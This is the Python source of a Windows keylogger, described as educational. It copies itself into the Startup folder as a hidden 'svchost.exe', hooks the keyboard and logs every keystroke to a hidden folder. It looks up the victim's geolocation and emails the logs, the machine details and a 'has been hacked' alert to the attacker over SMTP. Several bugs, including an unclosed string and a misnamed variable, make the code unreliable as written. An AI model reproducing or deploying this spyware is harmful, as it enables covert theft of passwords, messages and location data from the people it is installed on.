#-*- coding: utf-8 -*-

#########################################
# author: Krystian C.                   #
# 21.10.2017                            #
# Keylogger are made only for education #
# Made by 13 year old teenager          #
#########################################

#### My github ######## My github ######## My github ######## My github ####
#
# My Github: https://github.com/Krystian-Cryhoo/SimpleKeylogger/
#
#### My github ######## My github ######## My github ######## My github ####

############################## That you need ##############################
# ipgetter - https://github.com/phoemur/ipgetter/blob/master/ipgetter.py
# pyHook - https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
# pyWin32 - https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/
# requests - http://docs.python-requests.org/en/master/
############################## That you need ##############################

#### py2exe ####### py2exe ####### py2exe ####### py2exe ###
#
#pyInstaller - https://pypi.python.org/pypi/PyInstaller/3.3
#
#### py2exe ####### py2exe ####### py2exe ####### py2exe ###


import pythoncom, pyHook, os, ipgetter, requests, time, smtplib, getpass, win32con, win32api, shutil, sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

userName = getpass.getuser()
filePath = "C:\users\%s\AppData\Roaming\Microsoft\\" %userName
fileHidden = filePath + '\importantWindowsLogs\\'
StartUP = "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\" %userName 

#Add virus to startup and change name on 'svchost'
if os.path.exists(StartUP):
         if os.path.isfile(StartUP + 'svchost.exe') == False:
                try:
                        shutil.copy2(sys.argv[0], StartUP + 'svchost.exe')
                        win32api.SetFileAttributes(StartUP + 'svchost.exe',win32con.FILE_ATTRIBUTE_HIDDEN)
                except:
                        pass


#Send Mail if keylogger is first opened
def SendHKD():
        try:
            #Get IP
            IPs = ipgetter.myip()
            #Get computer name & profile
            ComputerName = os.environ['COMPUTERNAME']
            ComputerProfile = os.environ['USERPROFILE']

            #Email login and pass
            email_user = 'here_your_mail@mail.com'
            email_pass = 'here_your_password'

            #Change subject
            subject = time.strftime("%d %b %Y - " + IPs + " - ") + ComputerName + " -  First HKD"

            #From, To, Subject - settings
            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_user
            msg['Subject'] = subject

            #Body = message
            body = Computername + " has been hacked"

            msg.attach(MIMEText(body, 'plain'))
            text = msg.as_string()

            #Connecting to smtplib
            sendM = smtplib.SMTP('Here_SMTP', 587)
            sendM.starttls()
            sendM.login(email_user, email_pass)

            #Send Mail && Quit
            sendM.sendmail(email_user, email_user, text)
            sendM.quit()

            OnKeyboardEvent()
        except:
            pass
        return True


#Send e-mail with logs
def SendMail():
        try:
            
            #Get computer name & profile
            ComputerName = os.environ['COMPUTERNAME']
            ComputerProfile = os.environ['USERPROFILE']

            #Email login and pass
            email_user = 'here_your_mail@mail.com'
            email_pass = 'here_your_password'

            #Change subject
            subject = time.strftime("%d %b %Y - %H:%M:%S - ") + ComputerName

            #From, To, Subject - settings
            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_user
            msg['Subject'] = subject

            #read logs
            f = open(fileHidden + "logs.txt", "r")
            data = f.read()
            f.close()

            f = open(fileHidden + "infoIP.txt", "r")
            infoIP = f.read()
            f.close
            #Body = message

            Cn = "Computer Name: " + ComputerName
            Cp = "\nUserProfile: " + ComputerProfile
            Ct = "\nComputer Time: " +  time.strftime("%d %b %Y - %H:%M:%S - ")
            Cip = "\nInformation about geolocation:\n " +str(infoIP)
            Cd = "\n\n Keylogs:\n " +str(data)

            body = Cn + Cp + Ct + Cip + Cd

            msg.attach(MIMEText(body, 'plain'))
            text = msg.as_string()

            #Connectin2smtplib
            sendM = smtplib.SMTP('here_SMTP, 587)
            sendM.starttls()
            sendM.login(email_user, email_pass)

            #Send Mail && Quit
            sendM.sendmail(email_user, email_user, text)
            sendM.quit()

            os.remove(fileHidden + "logs.txt")
            OnKeyboardEvent()
        except:
            pass
        return True

#Try get geolocation
def Gelocoations():
                try: 
                    IP = ipgetter.myip()
                    url = 'http://freegeoip.net/json/'+IP
                    r = requests.get(url)
                    js = r.json()
                except:
                    pass


                #Geolocation(Public IP, etc)


                if os.path.exists(fileHidden + "infoIP.txt") == False:
                        Getlocation(js)
                else:
                        firstLine = str(' IP Adress: '         +   js['ip']) + '\n'
                        CheckIP = open(fileHidden + "infoIP.txt", "r")
                        txtLine = CheckIP.readline()
                        CheckIP.close()

                        if firstLine != txtLine:
                                os.remove(fileHidden + "infoIP.txt")
                                Getlocation(js)


#getIP - geolocation
def Getlocation(js):
            IPtxt = open(fileHidden + "infoIP.txt", "a")
            IPtxt.write(' IP Adress: '         +   js['ip'] + '\n')
            IPtxt.write(' Country Code: '      +   js['country_code'] + '\n')
            IPtxt.write(' Country Name: '      +   js['country_name'] + '\n')
            IPtxt.write(' Region Code: '       +   js['region_code'] + '\n')
            IPtxt.write(' Region Name: '       +   js['region_name'] + '\n')
            IPtxt.write(' City Name: '         +   js['city'] + '\n')
            IPtxt.write(' Zip code: '          +   js['zip_code'] + '\n')
            IPtxt.write(' Time Zone: '         +   js['time_zone'] + '\n')
            IPtxt.write(' Latitude: '          +   str(js['latitude']) + '\n')
            IPtxt.write(' Longitude: '         +   str(js['longitude']) + '\n')
            IPtxt.close()

#If you hit key
def OnKeyboardEvent(event):
        
        global logs


        
        g = open(fileHidden + "logs.txt", "a")

        #Others KeyID
        if event.KeyID == 8:
                     logs = "[BACKSPACE]"
        elif event.KeyID == 9:
                     logs = "[TAB]\t"
        elif event.KeyID == 13:
                     logs = "[ENTER]\n"
        #Normal Ascii
        else:
             logs = chr(event.Ascii)

        #Write a logs to txt
        g.write(logs)
        g.close()

        #Open and read logs
        d = open(fileHidden + "logs.txt", "r")
        data = d.read()
        d.close()

        #Check length data(logs.txt) && send mail
        if len(data) >= 500:
            try:
                SendMail()
            except:
                pass
        
        return True

#Create hidden folder with informations
if os.path.exists(filePath):
    try:
        os.makedirs( filePath + '\importantWindowsLogs')
        win32api.SetFileAttributes(filePath + '\importantWindowsLogs',win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass


#Create a logs.txt
if os.path.exists(fileHidden + "logs.txt") == False:
        f = open(fileHidden + "logs.txt", "a")
        f.write("--- Date: " + time.strftime("%d %b %Y - %H:%M:%S") +  " ---\n")
        f.close()
else:
        nL = open(fileHidden + "logs.txt", "a")
        nL.write("\n--- Date: " + time.strftime("%d %b %Y - %H:%M:%S") +  " ---\n")
        nL.close()

#First opened virus = send e-mail about it
if os.path.exists(fileHidden + "firstHKD.txt") == False:
        hkd = open(fileHidden + "firstHKD.txt", "a")
        hkd.close()
        SendHKD()

Gelocoations()
#PyHook
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

#PumpMessage
pythoncom.PumpMessages()
